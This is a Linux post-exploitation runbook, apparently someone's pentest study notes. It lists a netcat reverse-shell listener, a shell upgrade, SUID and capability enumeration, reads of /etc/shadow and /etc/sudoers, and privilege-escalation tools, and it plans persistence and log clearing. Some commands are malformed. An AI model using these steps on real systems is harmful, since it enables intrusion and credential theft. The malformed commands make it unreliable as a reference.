# Linux Runbook
* [Task List](#task-list)
* [Stabilize Shell](#stabilize-shell)
* [Copy tools to the target](#copy-tools-to-the-target)
* [Enumerate](#enumerate)
* [Establish tunnel](#establish-tunnel)
* [Establish persistance](#establish-persistance)
* [Automated Tools](#automated-tools)

## Task List

- [ ] [Stabilize shell](#stabilize-shell)
- [ ] [Copy tools to the target](#copy-tools-to-the-target)
- [ ] [Enumerate](#enumerate)
  - [ ] [System Info](#system-info)
  - [ ] [Permissions](#permissions)
  - [ ] [Processes and Services](#processes-and-services)
  - [ ] [Networking](#networking)
  - [ ] [Users and Groups](#users-and-groups)
  - [ ] [Tasks](#tasks)
  - [ ] [Logs](#logs)
  - [ ] [Installed software](#installed-software)
- [ ] [Finalize](#Finalize)
  - [ ] [Establish tunnel](#establish-tunnel)
  - [ ] [Copy information from the target](#copy-tools)
  - [ ] [Establish persistance](#establish-persistance)
  - [ ] [Clear logs]


## Stabilize Shell  

- Listen to reverse shell:

```bash
rlwrap nc -lvnp 443
```

- Upgrade the shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Explicit python version may be required.
```

## Copy tools to the target

## Enumerate

- ### System Info

  - System specific info
  
    ```bash
    cat /etc/issue 
    cat /etc/os-release
    uname -r
    arch
    id
    ```

- ### Permissions
  
  - Find suspicious files
    ```bash
    # Files with SUID bit
    find / -perm -u=s -type f 2>/dev/null
    # Directories with writable permissions
    find / -writeable -type d 2>/dev/null
    # Look for useful files
    find / -type f -name -o -name "*.txt" -o -name "*.kdbx" -o -name "*.zip" 2>/dev/null
    # Files that may give you have +x
    find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
    # Manually Enumerating Capabilities
    /usr/sbin/getcap -r / 2>/dev/null
    # List commands that user can run as sudo  - >  GTFObins
    sudo -l
    ```

  - Mounted permissions

    ```bash
    cat /etc/fstab
    lsblk
    ```

- ### Processes and Services

  - Running Processes

    ```python
    python3 -c 'import pty;pty.spawn("/bin/bash")'
     ```

- ### Networking
  
  - Ip info
    - ifconfig
    - netstat -an
    - ss -an
    - lsof -i
  - Routing info
    - routel
    - route
  - Firewalls
    - iptables (cat /etc/iptables/rules.v4)
    - ufw
  
- ### Users and Groups

  - Users

    ```bash
    - cut -d: -f1 /etc/passwd
    - ?sudo --version 1.18.31
    ```

  - Groups

    ```bash
    - cut -d: -f1 /etc/group
    - cat /etc/shadow
    - cat /etc/sudoers
    ```

- ### Tasks

  - Crontab

    ```bash
    ls -lah /etc/cron*
    crontab -l
    ```
  
- ### Logs

  - Bash history
  - /var/logs
  - user ./.bash_history
  - ls /opt; 
  - ls /var/mail
  
- ### Installed software

  - View installed software

     ```bash
    # rpm
    rpm -qa; yum list installed;
    # apt
     dpkg -l; apt list installed;
    ```

## Establish tunnel

## Establish persistance




## Automated Tools

- unix-privesc-check
- linpeas.sh
- pspy64
